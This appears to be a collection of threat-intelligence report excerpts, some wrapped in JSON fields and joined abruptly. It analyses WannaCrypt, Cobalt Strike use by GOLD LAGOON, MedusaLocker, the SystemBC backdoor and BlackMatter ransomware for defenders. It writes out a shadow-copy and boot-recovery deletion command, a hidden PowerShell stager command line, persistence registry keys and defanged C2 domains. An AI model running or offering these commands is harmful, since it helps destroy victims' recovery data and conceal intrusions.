attacker will attempt to react to our\ndetection response.\n\nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced\nattacks, sign up for a free trial.\n\nAttack vector\n\nRansomware threats do not typically spread rapidly. Threats like WannaCrypt (also known as WannaCry,\nWanaCrypt0r, WCrypt, or WCRY) usually leverage social engineering or email as primary attack vector, relying\non users downloading and executing a malicious payload. However, in this unique case, the ransomware\nperpetrators used publicly available exploit code for the patched SMB “EternalBlue” vulnerability, CVE-2017-\n0145, which can be triggered by sending a specially crafted packet to a targeted SMBv1 server. This vulnerability\nwas fixed in security bulletin MS17-010, which was released on March 14, 2017.\n\nWannaCrypt’s spreading mechanism is borrowed from well-known public SMB exploits, which armed this regular\nransomware with worm-like functionalities, creating an entry vector for machines still unpatched even after the fix\nhad become available.\n\nThe exploit code used by WannaCrypt was designed to work only against unpatched Windows 7 and Windows\nServer 2008 (or earlier OS) systems, so Windows 10 PCs are not affected by this attack.\n\nWe haven’t found evidence of the exact initial entry vector used by this threat, but there are two scenarios that\nwe believe are highly possible explanations for the spread of this ransomware:\n\nArrival through social engineering emails designed to trick users to run the malware and activate the worm-\nspreading functionality with the SMB exploit\nInfection through SMB exploit when an unpatched computer is addressable from other infected machines\n\nhttps://www.microsoft.com/security/blog/2017/05/12/wannacrypt-ransomware-worm-targets-out-of-date-systems/\nhttps://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Ransom:Win32/WannaCrypt\nhttps://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nhttps://cloudblogs.microsoft.com/microsoftsecure/2018/01/10/a-worthy-upgrade-next-gen-security-on-windows-10-proves-resilient-against-ransomware-outbreaks-in-2017/\nhttps://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc\nhttps://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc\nhttps://blogs.technet.microsoft.com/mmpc/2017/06/16/analysis-of-the-shadow-brokers-release-and-mitigation-with-windows-10-virtualization-based-security/\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0145\nhttps://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nhttps://packetstormsecurity.com/files/142464/MS17-010-SMBv1-SrvOs2FeaToNt-OOB-Remote-Code-Execution.html\nhttps://github.com/RiskSense-Ops/MS17-010\nhttps://blogs.technet.microsoft.com/mmpc/2017/06/08/windows-10-creators-update-hardens-security-with-next-gen-defense/\n\n\n2/12\n\nDropper\n\nThe threat arrives as a dropper Trojan that has the following two components:\n\n1.

The ransomware known as WannaCrypt\n\nThe dropper tries to connect the following domains using the API InternetOpenUrlA():\n\nwww[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\nwww[.]ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\nwww[x].iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]test\n\nIf connection to the domains is successful, the dropper does not infect the system further with ransomware or try\nto exploit other systems to spread; it simply stops execution. However, if the connection fails, the threat proceeds\nto drop the ransomware and creates a service on the system.\n\nIn other words, unlike in most malware infections, IT Administrators should NOT block these domains. Note\nthat the malware is not proxy-aware, so a local DNS record may be required. This does not need to point to the\nInternet, but can resolve to any accessible server which will accept connections on TCP 80.\n\nThe threat creates a service named mssecsvc2.0, whose function is to exploit the SMB vulnerability in other\ncomputers accessible from the infected system:\n\nService Name: mssecsvc2.0\n Service Description: (Microsoft Security Center (2.0) Service)\n\n Service Parameters: “-m security”\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt11.png\n\n\n3/12\n\nWannaCrypt ransomware\n\nThe ransomware component is a dropper that contains a password-protected .zip archive in its resource section.\nThe document encryption routine and the files in the .zip archive contain support tools, a decryption tool, and the\nransom message. In the samples we analyzed, the password for the .zip archive is “WNcry@2ol7”.\n\nWhen run, WannaCrypt creates the following registry keys:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\\<random string> = “<malware working\ndirectory>\\tasksche.exe”\nHKLM\\SOFTWARE\\WanaCrypt0r\\\\wd = “<malware working directory>”\n\nIt changes the wallpaper to a ransom message by modifying the following registry key:\n\nHKCU\\Control Panel\\Desktop\\Wallpaper: “<malware working directory>\\@WanaDecryptor@.bmp”\n\nIt creates the following files in the malware’s working directory:\n\n00000000.eky\n00000000.pky\n00000000.res\n274901494632976.bat\n@Please_Read_Me@.txt\n@WanaDecryptor@.bmp\n@WanaDecryptor@.exe\nb.wnry\nc.wnry\nf.wnry\nm.vbs\nmsg\\m_bulgarian.wnry\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt2.png\n\n\n4/12\n\nmsg\\m_chinese (simplified).wnry\nmsg\\m_chinese (traditional).wnry\nmsg\\m_croatian.wnry\nmsg\\m_czech.wnry\nmsg\\m_danish.wnry\nmsg\\m_dutch.wnry\nmsg\\m_english.wnry\nmsg\\m_filipino.wnry\nmsg\\m_finnish.wnry\nmsg\\m_french.wnry\nmsg\\m_german.wnry\nmsg\\m_greek.wnry\nmsg\\m_indonesian.wnry\nmsg\\m_italian.wnry\nmsg\\m_japanese.wnry\nmsg\\m_korean.wnry\nmsg\\m_latvian.wnry\nmsg\\m_norwegian.wnry\nmsg\\m_polish.wnry\nmsg\\m_portuguese.wnry\nmsg\\m_romanian.wnry\nmsg\\m_russian.wnry\nmsg\\m_slovak.wnry\nmsg\\m_spanish.wnry\nmsg\\m_swedish.wnry\nmsg\\m_turkish.wnry\nmsg\\m_vietnamese.wnry\nr.wnry\ns.wnry\nt.wnry\nTaskData\\Tor\\libeay32.dll\nTaskData\\Tor\\libevent-2-0-5.dll\nTaskData\\Tor\\libevent_core-2-0-5.dll\nTaskData\\Tor\\libevent_extra-2-0-5.dll\nTaskData\\Tor\\libgcc_s_sjlj-1.dll\nTaskData\\Tor\\libssp-0.dll\nTaskData\\Tor\\ssleay32.dll\nTaskData\\Tor\\taskhsvc.exe\nTaskData\\Tor\\tor.exe\nTaskData\\Tor\\zlib1.dll\ntaskdl.exe\ntaskse.exe\nu.wnry\n\nWannaCrypt may also create the following files:\n\n%SystemRoot%\\tasksche.exe\n%SystemDrive%\\intel\\<random directory name>\\tasksche.exe\n%ProgramData%\\<random directory name>\\tasksche.exe\n\nIt may create a randomly named service that has the following associated ImagePath: “cmd.exe /c “<malware\nworking directory>\\tasksche.exe””.\n\n\n\n5/12\n\nIt then searches the whole computer for any file with any of the following file name extensions: .123, .jpeg , .rb ,\n.602 , .jpg , .rtf , .doc , .js , .sch , .3dm , .jsp , .sh , .3ds , .key , .sldm , .3g2 , .lay , .sldm , .3gp , .lay6 , .sldx , .7z ,\n.ldf , .slk , .accdb , .m3u , .sln , .aes , .m4u , .snt , .ai , .max , .sql , .ARC , .mdb , .sqlite3 , .asc , .mdf , .sqlitedb ,\n.asf , .mid , .stc , .asm , .mkv , .std , .asp , .mml , .sti , .avi , .mov , .stw , .backup , .mp3 , .suo , .bak , .mp4 , .svg ,\n.bat , .mpeg , .swf , .bmp , .mpg , .sxc , .brd , .msg , .sxd , .bz2 , .myd , .sxi , .c , .myi , .sxm , .cgm , .nef , .sxw ,\n.class , .odb , .tar , .cmd , .odg , .tbk , .cpp , .odp , .tgz , .crt , .ods , .tif , .cs , .odt , .tiff , .csr , .onetoc2 , .txt , .csv ,\n.ost , .uop , .db , .otg , .uot , .dbf , .otp , .vb , .dch , .ots , .vbs , .der” , .ott , .vcd , .dif , .p12 , .vdi , .dip , .PAQ ,\n.vmdk , .djvu , .pas , .vmx , .docb , .pdf , .vob , .docm , .pem , .vsd , .docx , .pfx , .vsdx , .dot , .php , .wav , .dotm ,\n.pl , .wb2 , .dotx , .png , .wk1 , .dwg , .pot , .wks , .edb , .potm , .wma , .eml , .potx , .wmv , .fla , .ppam , .xlc , .flv ,\n.pps , .xlm , .frm , .ppsm , .xls , .gif , .ppsx , .xlsb , .gpg , .ppt , .xlsm , .gz , .pptm , .xlsx , .h , .pptx , .xlt , .hwp ,\n.ps1 , .xltm , .ibd , .psd , .xltx , .iso , .pst , .xlw , .jar , .rar , .zip , .java , .raw.\n\nWannaCrypt encrypts all files it finds and renames them by appending .WNCRY to the file name. For example, if\na file is named picture.jpg, the ransomware encrypts and renames the file to picture.jpg.WNCRY.\n\nThis ransomware also creates the file @Please_Read_Me@.txt in every folder where files are encrypted. The file\ncontains the same ransom message shown in the replaced wallpaper image (see screenshot below).\n\nAfter completing the encryption process, the malware deletes the volume shadow copies by running the following\ncommand:\n\ncmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default}\nbootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet\n\nIt then replaces the desktop background image with the following message:\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt-ransom-note.png\n\n\n6/12\n\nIt also runs an executable showing a ransom note which indicates a $300 ransom in Bitcoins as well as a timer:\n\nThe text is localized into the following languages: Bulgarian, Chinese (simplified), Chinese (traditional), Croatian,\nCzech, Danish, Dutch, English, Filipino, Finnish, French, German, Greek, Indonesian, Italian, Japanese, Korean,\nLatvian, Norwegian, Polish, Portuguese, Romanian, Russian, Slovak, Spanish, Swedish, Turkish, and\nVietnamese.\n\nThe ransomware also demonstrates the decryption capability by allowing the user to decrypt a few random files,\nfree of charge. It then quickly reminds the user to pay the ransom to decrypt all the remaining files.\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt-ransom-executable.png\n\n\n7/12\n\nSpreading capability\n\nThe worm functionality attempts to infect unpatched Windows machines in the local network. At the same time, it\nalso executes massive scanning on Internet IP addresses to find and infect other vulnerable computers. This\nactivity results in large SMB traffic from the infected host, which can be observed by SecOps personnel, as\nshown below.\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt-decryptor.png\n\n\n8/12\n\nThe Internet scanning routine randomly generates octets to form the IPv4 address. The malware then targets that\nIP to attempt to exploit CVE-2017-0145. The threat avoids infecting the IPv4 address if the randomly generated\nvalue for first octet is 127 or if the value is equal to or greater than 224, in order to skip local loopback interfaces.\nOnce a vulnerable machine is found and infected, it becomes the next hop to infect other machines. The vicious\ninfection cycle continues as the scanning routing discovers unpatched computers.\n\nWhen it successfully infects a vulnerable computer, the malware runs kernel-level shellcode that seems to have\nbeen copied from the public backdoor known as DOUBLEPULSAR, but with certain adjustments to drop and\nexecute the ransomware dropper payload, both for x86 and x64 systems.\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt-exploit.png\n\n\n9/12\n\nProtection against the WannaCrypt attack\n\nTo get the latest protection from Microsoft, upgrade to Windows 10. Keeping your computers up-to-date gives\nyou the benefits of the latest features and proactive mitigations built into the latest versions of Windows.\n\nWe recommend customers that have not yet installed the security update MS17-010 do so as soon as possible.\nUntil you can apply the patch, we also recommend two possible workarounds to reduce the attack surface:\n\nDisable SMBv1 with the steps documented at Microsoft Knowledge Base Article 2696547 and as\nrecommended previously\nConsider adding a rule on your router or firewall to block incoming SMB traffic on port 445\n\nWindows Defender Antivirus detects this threat as Ransom:Win32/WannaCrypt as of the 1.243.297.0 update.\nWindows Defender Antivirus uses cloud-based protection, helping to protect you from the latest threats.\n\nFor enterprises, use Device Guard to lock down devices and provide kernel-level virtualization-based security,\nallowing only trusted applications to run, effectively preventing malware from running.\n\nUse Office 365 Advanced Threat Protection, which has machine learning capability that blocks dangerous email\nthreats, such as the emails carrying ransomware.\n\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt7.png\nhttps://www.microsoft.com/security/blog/uploads/2018/01/WannaCrypt8.png\nhttps://www.microsoft.com/en-us/windows/windows-10-upgrade\nhttps://www.microsoft.com/en-us/security/portal/mmpc/help/updatefaqs.aspx\nhttps://technet.microsoft.com/en-us/library/security/ms17-010.aspx\nhttps://support.microsoft.com/kb/2696547\nhttps://blogs.technet.microsoft.com/filecab/2016/09/16/stop-using-smb1/\nhttps://technet.microsoft.com/en-us/itpro/windows/keep-secure/windows-defender-in-windows-10\nhttps://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Ransom:Win32/WannaCrypt\nhttps://technet.microsoft.com/itpro/windows/keep-secure/device-guard-deployment-guide\nhttps://blogs.office.com/2015/04/08/introducing-exchange-online-advanced-threat-protection/\n\n\n10/12\n\nMonitor

      "plain_text": "1/3\n\nCounter Threat Unit Research Team\n\nDetecting Cobalt Strike: Cybercrime Attacks\nsecureworks.com/blog/detecting-cobalt-strike-cybercrime-attacks\n\nCountermeasures that detect malicious Cobalt Strike activity enabled a compromised\norganization to mitigate a GOLD LAGOON intrusion before the threat actors deployed\nransomware. Wednesday, August 4, 2021 By: Counter Threat Unit Research Team\nMany cybercriminals that operate malware use the ubiquitous Cobalt Strike tool to drop\nmultiple payloads after profiling a compromised network. Cobalt Strike is a commercially\navailable and popular command and control (C2) framework used by the security community\n\nhttps://www.secureworks.com/blog/detecting-cobalt-strike-cybercrime-attacks\n\n\n2/3\n\nas well as a wide range of threat actors. The robust use of Cobalt Strike lets threat actors\nperform intrusions with precision.\n\nSecureworks® Counter Threat Unit™ (CTU) researchers conducted a focused investigation\ninto malicious use of Cobalt Strike to gain insights about when and how the tool has been\nused. This knowledge can help to secure organizations that may be targeted by threat actors\nwith diverse motives.\n\nUnderstanding a threat actor's end goal is important. For example, the financially motivated\nGOLD LAGOON threat group leverages the Qakbot botnet to deploy Cobalt Strike. CTU™\nresearchers frequently observe GOLD LAGOON deploying Cobalt Strike to Qakbot-infected\nhosts that are identified as members of an Active Directory domain. The threat actors then\nuse Cobalt Strike to move laterally throughout the network, establish persistence, and\nultimately facilitate damaging post-intrusion ransomware attacks. GOLD LAGOON provides\naccess to other threat groups that deploy various ransomware families in compromised\nenvironments.\n\nThe value of early detection is highlighted by two similar incidents. In the first incident,\nSecureworks incident responders helped the victim recover from a REvil ransomware attack.\nThe organization did not have an endpoint detection and response (EDR) solution that\nidentified the preceding Qakbot and Cobalt Strike activity, which enabled the threat actors to\nachieve their objectives. In the second incident, Secureworks Taegis™ XDR\ncountermeasures detected and alerted on the malicious Qakbot and Cobalt Strike activity in\nthe environment, enabling network defenders to respond quickly to contain and mitigate the\nintrusion before ransomware was deployed.\n\nIn this second incident, a user opened an Excel 4.0 macro worksheet attached to a phishing\nemail. The attachment downloaded and installed Qakbot. Qakbot profiled the infected host,\nsent the profiled data to its C2 servers, and then downloaded and executed Cobalt Strike\nBeacon. The threat actor used Cobalt Strike Beacon's remote code execution capability to\nexecute the ping utility. Ping identified additional accessible servers within the network. The\nthreat actor deployed Cobalt Strike Beacon on those targets and then executed arbitrary\ncommands on those systems via the Rundll32 execution utility. One of these commands\nattempted to discover domain administrator accounts.\n\nThis process of deploying Cobalt Strike Beacon to additional servers from a compromised\nhost lets network defenders detect the service established on the remote host, the admin\nshare launching content, and the resulting command execution:\n\nBy default, Cobalt Strike always leverages the Rundll32 utility for command execution.\nCobalt Strike always launches Rundll32 as a service via the 'ADMIN$' share on the\nremote host.\nThe binary that Cobalt Strike uses to launch Rundll32 via the 'ADMIN$' share always\nhas a filename that is exactly seven alphanumeric characters.\n\nhttps://www.secureworks.com/research/threat-profiles/gold-lagoon\nhttps://www.secureworks.com/research/revil-sodinokibi-ransomware\nhttps://www.secureworks.com/products/taegis/xdr\nhttps://www.cobaltstrike.com/help-beacon\n\n\n3/3\n\n \nThe threat actor also installed Cobalt Strike PowerShell stagers on servers accessed when\nmoving laterally through the compromised network. These stagers allowed the Cobalt Strike\nBeacon payload to execute in memory. Cobalt Strike PowerShell stager's default execution\npattern is always configured to launch as a service and is invoked from the command line\nwith the parameters \"/b /c start /b /min powershell -nop -w hidden\". The stager executes and\ndecodes a byte sequence in memory to launch Cobalt Strike via a reflected loaded library.\n\nTable 1 maps the observed GOLD LAGOON techniques to the MITRE ATT&CK® framework.\n\nObserved activity MITRE ATT&CK mapping\n\nPhishing campaigns Phishing: Spearphishing Attachment\n\nRemote code execution Command and Scripting Interpreter: Windows Command Shell\nSigned Binary Proxy Execution: Rundll32\nCommand and Scripting Interpreter: PowerShell\n\nNetwork reconnaissance Remote System Discovery\nAccount Discovery: Domain Account\n\nLateral movement Remote Services: SMB/Windows Admin Shares\n\nDefense evasion Process Injection: Proc Memory\nDeobfuscate/Decode Files or Information\n\nEstablishing persistence Create or Modify System Process: Windows Service\n\nTable 1. MITRE ATT&CK techniques used by GOLD LAGOON.\n\nThe availability of unauthorized Cobalt Strike versions on the dark web means that threat\nactors can abuse it. Network defenders must attempt to answer the \"friend or foe\" question\nwhen they detect Cobalt Strike in their environment, as the tool can be used for both\nlegitimate and malicious purposes. Taegis XDR, which is continually updated with\nintelligence gained through CTU research, helps organizations differentiate noise, legitimate\nuse, and actionable alerts. Preview Taegis XDR to explore more coverage for MITRE\nATT&CK techniques.\n\nOther posts in this series:\n\nhttps://attack.mitre.org/\nhttps://attack.mitre.org/techniques/T1566/001/\nhttps://attack.mitre.org/techniques/T1059/003/\nhttps://attack.mitre.org/techniques/T1218/011\nhttps://attack.mitre.org/techniques/T1059/001\nhttps://attack.mitre.org/techniques/T1018\nhttps://attack.mitre.org/techniques/T1087/002\nhttps://attack.mitre.org/techniques/T1021/002\nhttps://attack.mitre.org/techniques/T1055/009\nhttps://attack.mitre.org/techniques/T1140\nhttps://attack.mitre.org/techniques/T1543/003\nhttps://www.secureworks.com/resources/tl-mitre-adversary-software-coverage-tool",

We cover the business\nramifications of the attack, technical analysis and some advice based on attacks such as\nthese.\n\nContinued from parts 1 and 2...\n\nATT&CK Map\n\nWe have mapped the TTPs of this adversary to the MITRE ATT&CK framework as a\nheatmap of activity. We can see that this adversary used a limited, but powerful, selection of\nTTPs.\n\nhttps://www.theta.co.nz/news-blogs/cyber-security-blog/part-3-analysing-medusalocker-ransomware/\nhttps://www.theta.co.nz/news-blogs/cyber-security-blog/part-1-analysing-medusalocker-ransomware/\nhttps://www.theta.co.nz/news-blogs/cyber-security-blog/part-2-analysing-medusalocker-ransomware/\n\n\n2/4\n\nAccess PNG of image above.\n\nUnfortunately, we’re seeing the same TTPs being used over and over again for ransomware\nattacks, even if the initial access or lateral movement exploits vary.\n\nWe keep getting asked by customers to “tell us what we don’t know about our\nvulnerabilities”. While the use of traditional defensive frameworks like ISO 27001, NIST or\nPCI serve a compliance function, thinking like an attacker can rapidly highlight blind spots in\nyour environment.\n\nPhishing attacks are a nuisance but largely a means to an end for adversaries and won’t put\nyou out of business on their own. A ransomware attack will lose reputation, money and\ncustomers. \n\n Never mind encrypting user workstations or file shares - destroying ERP and EDI systems\n(as happened here) will leave an organisation completely unable to trade and haemorrhaging\nmoney. That’s not counting the cost of restoring business systems, which is incredibly labour-\nintensive, let alone the underlying IT infrastructure and the other parts of the Incident\nResponse process, or the intangibles like the reputational damage.\n\nhttps://www.theta.co.nz/media/3966/medusa_locker_ttps__june_2020_-1.png\n\n\n3/4\n\nWithout enough cash reserves or insurance coverage, there’s a real chance of even\nmedium-sized business ending up underwater depending on time-to-recovery and the bill at\nthe end. You might be tempted to just pay the ransom – but this isn’t a great option either as\nthere’s no guarantee you’ll get what you paid for.

      "plain_text": "1/9\n\nDecember 16, 2020\n\nRansomware operators use SystemBC RAT as off-the-\nshelf Tor backdoor\n\nnews.sophos.com/en-us/2020/12/16/systembc/\n\nIn our investigations into a number of recent ransomware attacks, we’ve observed sets of\ntools associated with multiple types of ransomware deployed in much the same way,\nsuggesting their use by one or more ransomware-as-a-service affiliates.  One of those tools\nis SystemBC, a backdoor that provides attackers with a persistent connection to their victims’\nsystems.\n\nFirst seen in 2019, SystemBC is a proxy and remote administrative tool, named by\nresearchers after the string in the URI its control panel used.  It acts both as a network proxy\nfor  concealed communications and as a remote administration tool (RAT)—capable of\nexecuting Windows commands, and delivering and executing scripts, malicious executables\nand dynamic link libraries (DLLs).  After being dropped by other malware, it provides\nattackers with a persistent backdoor.\n\nWhile SystemBC has been around for over a year, we’ve seen both its use and its features\ncontinue to evolve. The most recent samples of SystemBC carry code that, instead of acting\nessentially as a virtual private network via a SOCKS5 proxy, uses the Tor anonymizing\nnetwork to encrypt and conceal the destination of command and control traffic.\n\nOver the past few months, we have continued to detect hundreds of attempted SystemBC\ndeployments worldwide. SystemBC was used in recent Ryuk and Egregor attacks\ninvestigated by Sophos MTR’s Rapid Response team, often used in combination with post-\n\nhttps://news.sophos.com/en-us/2020/12/16/systembc/\n\n\n2/9\n\nexploitation tools such as Cobalt Strike. In some cases, the SystemBC RAT was deployed to\nservers after the attackers have gained administrative credentials and moved deep into the\ntargeted network.\n\nDeployment\n\nWhen dropped and executed, SystemBC performs a check to see whether it was launched\nwith a command line “start”—indicating it was executed as a scheduled service.  If not, it\ncopies itself to a randomly-named directory and file name within the ProgramData directory,\nand then schedules that copy as a task (launched with the “start” command)  to achieve\npersistence.\n\n However, if SystemBC finds a running process called a2guard.exe—a component of\nEmsisoft’s anti-malware software—it skips the creation of a service. This behavior dates\nback to the first samples of SystemBC found in 2019.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/SystemBC.png\n\n\n3/9\n\nDecompiled code from SystemBC showing the installation logic.\nOnce SystemBC is launched from its scheduled task, it starts its command and control\nconnections.\n\nBC phone home\n\nThere are two elements of the CnC: a beacon connection to a remote server at one of two\ndomains hard-coded into the the malware, and a lightweight Tor client.\n\nThe non-Tor communications are raw TCP, connecting to port 4044 (typically used by the\nLocation Tracking Protocol) on the remote server. The domains varied from sample to\nsample—likely configured for a specific campaign at build-time. We observed two domains in\nuse in our primary sample: advertrex20[.]xyz and gentexman37[.]xyz. The first domain no\nlonger resolved at the time of analysis; during analysis, the second domain also became\nunreachable.\n\nThe malware selects one of the hardcoded domains, and sends an initial block of data (100\nbytes in this instance), then maintains an open socket, with the connection occasionally\nbeing reset.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/systembc-install.png\n\n\n4/9\n\nPart of a packet capture of SystemBC’s initial CnC communications \n\nThe\n\npacket block sending the initial data from SystemBC to the command and control domain.\nMost of the CnC communications with the SystemBC RAT are over a Tor connection. The Tor\ncommunications element of SystemBC appears to be based on mini-tor, an open-source\nlibrary for lightweight connectivity to the Tor anonymized network. The code of mini-Tor isn’t\nduplicated in SystemBC (since mini-Tor is written in C++ and SystemBC is compiled from C).\nBut the bot’s implementation of the Tor client closely resembles the implementation used in\nthe open-source program, including its extensive use of the Windows Crypto Next Gen\n(CNG) API’s Base Crypto (BCrypt) functions.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/systembc-heartbeat.png\nhttps://news.sophos.com/wp-content/uploads/2020/12/systembc-datablock.png\nhttps://github.com/wbenny/mini-tor/\n\n\n5/9\n\nSome of the Tor client code from the SystemBC executable dumped from memory and\ndisassembled. The IP addresses shown are known Tor gateway hosts, including\ndannenberg[.]torauth[.]de and tor[.]noreply[.]orgWhen the bot is executed from scheduled\ntask, it  collects the following information and store it in a buffer and sends it to CnC through\nthe Tor connection:\n\nThe active Windows user name\nThe Windows build number for the infected system\nA WOW process check (whether the OS on the infected system is 32-bit or 64-bit)\nThe volume serial number.\n\nThe collected data is rc4 encrypted with a hard-coded key before it is sent it to CnC, using a\nsocket connection handled by the malware’s mini-tor library and socket APIs.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/IDApro_systembc_tor.png\n\n\n6/9\n\nA\n\nsnippet of decompiled code from SystemBC showing data sent about the targeted system\nback to the Tor CnC.\n\nRemote control\n\nThe operators of the bot can use the CnC server to send a number of payloads back to the\ninfected system for execution. SystemBC can parse and execute EXE or DLL data blobs\npassed over the Tor connection, shell code, VBS scripts, Windows commands and batch\nscripts, and PowerShell scripts.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/systembc_rat_cnc_sendclientdata.png\n\n\n7/9\n\nA\n\nchunk of the decompiled code from SystemBC showing types of data it expects from the\nCnC.\nFor VBS, BAT and CMD commands, the bot creates a randomly named file in the  %TEMP%\ndirectory and create a scheduled task for the script. For Powershell commands, it creates a\nscheduled task for the script and adds the following command line to make it hidden:\n\n'-WindowStyle Hidden -ep bypass -file \"'\n\nIf the data received is not parsed as a script, it checks for an MZ header in the data to check\nif it is a Windows executable. If it is, SystemBC loads it directly for execution without writing a\nfile. If the data received from the CnC doesn’t have any MZ signature, the bot assumes it is\nshellcode and spawns a thread to execute it. And If it is determined to be DLL binary data,\nSystemBC will load the dll using execute_pe_from_mem_thread and call its export function\nusing call_dll_export_function_thread.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/systembc_rat_data_receive.png\n\n\n8/9\n\nFrom spray and pray to sniping\n\nCollectively, these capabilities give attackers a point-and-shoot capability to perform\ndiscovery, exfiltration and lateral movement with packaged scripts and executables—without\nhaving to have hands on keyboard.  These capabilities were originally intended for mass\nexploitation, but they have now been folded into the toolkit for targeted attacks—including\nransomware.\n\nIn a September Ryuk attack, SystemBC was deployed on the target network’s domain\ncontroller—apparently deployed by CobaltStrike. And in November, we saw SystemBC in\nassociation with an Egregor attack—again associated with Cobalt Strike (though it is not\nclear which dropped which).\n\nIn these cases, SystemBC was deployed as one of several commodity tools to establish\npersistence across the targeted network. In the Ryuk attacks we saw with SystemBC, initial\ncompromise came from phishing messages that delivered the Buer Loader malware; other\nattacks in the same campaign used Bazar or Zloader. The Egregor attacks we saw used\nanother loader dropped by malicious emails—Qbot.\n\nAll of these attacks appear to have been launched by affiliates of the ransomware operators,\nor by the ransomware gangs themselves through multiple malware-as-a-service providers.\nThey involved days or weeks of time on the targets’ networks and data exfiltration.\nSystemBC is an attractive tool in these types of operations because it allows for multiple\ntargets to be worked at the same time with automated tasks, allowing for hands-off\ndeployment of ransomware using Windows built-in tools if the attackers gain the proper\ncredentials.\n\nhttps://news.sophos.com/wp-content/uploads/2020/12/SystemBC-MITRE-ATTACK.png\nhttps://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/\nhttps://news.sophos.com/en-us/2020/12/08/egregor-ransomware-mazes-heir-apparent/\n\n\n9/9\n\nFortunately, SystemBC is detected by many anti-malware tools, including Sophos (via both\nsignature and machine learning). Attackers continue to use SystemBC situationally with\nsuccess because they leverage inconsistent malware protection across organizations or\nleverage legitimate credentials to disable some malware protection.\n\nA list of IOCs for SystemBC is posted on SophosLabs’ GitHub page.\n\nSophos would like to acknowledge the contributions of Anand Aijan and Syraj\nMundalik of SophosLabs, and of Peter Mackenzie,Elida Leite, Syed Shahram and Bill\nKearney of the Sophos MTR Rapid Response team to this report.\n\nhttps://github.com/sophoslabs/IoCs/blob/master/Malware-SystemBC.csv",

Since July 2021, BlackMatter\nransomware has targeted multiple U.S. critical\ninfrastructure entities, including two U.S. Food and\nAgriculture Sector organizations.\n\nActions you Can Take Now to\nProtect Against BlackMatter\nRansomware:\n Implement and enforce backup\nand restoration policies and\nprocedures.\n Use strong, unique passwords.\n Use multi-factor authentication.\n Implement network segmentation\nand traversal monitoring.\n\nThis advisory provides information on cyber actor tactics,\ntechniques, and procedures (TTPs) obtained from a\nsample of BlackMatter ransomware analyzed in a\nsandbox environment as well from trusted third-party reporting. Using embedded, previously\ncompromised credentials, BlackMatter leverages the Lightweight Directory Access Protocol (LDAP)\nand Server Message Block (SMB) protocol to access the Active Directory (AD) to discover all hosts\non the network. BlackMatter then remotely encrypts the hosts and shared drives as they are found.\nRansomware attacks against critical infrastructure entities could directly affect consumer access to\ncritical infrastructure services; therefore, CISA, the FBI, and NSA urge all organizations, including\ncritical infrastructure organizations, to implement the recommendations listed in the Mitigations\nsection of this joint advisory. These mitigations will help organizations reduce the risk of compromise\nfrom BlackMatter ransomware attacks.\n\nVictims of ransomware should report it immediately to CISA at us-cert.cisa.gov/report, a local FBI Field Office,\nor U.S. Secret Service Field Office. When available, please include the following information regarding the\nincident: date, time, and location of the incident; type of activity; number of people affected; type of equipment\nused for the activity; the name of the submitting company or organization; and a designated point of contact. For\nNSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements\nCenter at 410-854-4200 or Cybersecurity_Requests@nsa.gov.\nThis document was developed by CISA, the FBI, and NSA in furtherance of their respective cybersecurity\nmissions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.\nThis document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information\ncarries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public\nrelease.

BlackMatter is a possible rebrand of DarkSide, a RaaS which was active from\nSeptember 2020 through May 2021. BlackMatter actors have attacked numerous U.S.-based\norganizations and have demanded ransom payments ranging from $80,000 to $15,000,000 in Bitcoin\nand Monero.\n\nTactics, Techniques, and Procedures\nThis advisory provides information on cyber actor TTPs\nobtained from the following sample of BlackMatter\nransomware, which was analyzed in a sandbox\nenvironment, as well as from trusted third parties: SHA256: 706f3eec328e91ff7f66c8f0a2fb9b556325\nc153a329a2062dc85879c540839d. (Note: click here to\nsee the sample’s page on VirusTotal.)\n\nThis advisory uses the MITRE\nATT&CK® framework, version 9.\nSee the ATT&CK for Enterprise for\nall referenced threat actor tactics and\ntechniques.\n\nThe BlackMatter variant uses embedded admin or user credentials that were previously compromised\nand NtQuerySystemInformation and EnumServicesStatusExW to enumerate running processes\nand services, respectively. BlackMatter then uses the embedded credentials in the LDAP and SMB\nprotocol to discover all hosts in the AD and the srvsvc.NetShareEnumAll Microsoft Remote\nProcedure Call (MSRPC) function to enumerate each host for accessible shares. Notably, this variant\nof BlackMatter leverages the embedded credentials and SMB protocol to remotely encrypt, from the\noriginal compromised host, all discovered shares’ contents, including ADMIN$, C$, SYSVOL, and\nNETLOGON.\nBlackMatter actors use a separate encryption binary for Linux-based machines and routinely encrypt\nESXI virtual machines. Rather than encrypting backup systems, BlackMatter actors wipe or 